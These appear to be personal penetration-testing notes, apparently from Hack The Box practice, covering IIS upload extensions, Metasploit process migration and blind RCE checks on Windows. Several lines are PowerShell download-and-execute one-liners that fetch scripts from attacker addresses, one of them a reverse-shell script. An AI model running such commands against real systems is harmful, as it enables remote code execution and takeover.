# Web

## File Upload

### WINDOWS

For IIS we could try extensions like:
* asp
* aspx
* config
* exe

# Exploit troubleshooting

## Migration to the more stable process
It is a good idea to migrate to a process running under ​ NT AUTHORITY\NETWORK SERVICE​.
In metasploit it's good idea to use ps and migrate commands.

## Timeout errors
If you noticed the vulnerable service is running very slow and you get an error during an exploitations, you can try to adjust response time in options by checking:
    msf > show advanced

# Blind RCE
Example: HTB\Optimum
## Check if it works
- try to run ping yourself from the host and check tcpdump
  - use full path
  - use URL encoding
  - Example
    - on the victim:
      - C:\Windows\System32\ping.exe 10.10.14.8
      - C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe -c ping 10.10.14.8
      - C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.8:8000')
    - on the attacker: >>tcpdump icmp

## Windows system folders
32-bit binaries: C:\\Windows\System32
32-bit binaries: C:\\Windows\SysWow64
64-bit binaries: C:\\Windows\SysNative

C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe
C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe -c ping 10.10.14.8

## Alternative run of PowerShell
Instead of
```
powershell -c <command>
```
we can use this trick:
```
echo <command> | powershell -
# Example:
echo IEX((New-Object Net.WebClient).DownloadString('http://10.10.14.6:8090/Invoke-PowerShellTcp.ps1')) | powershell -
```


# [Tools - Windows] Magic Unicorn
https://github.com/trustedsec/unicorn
Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory.
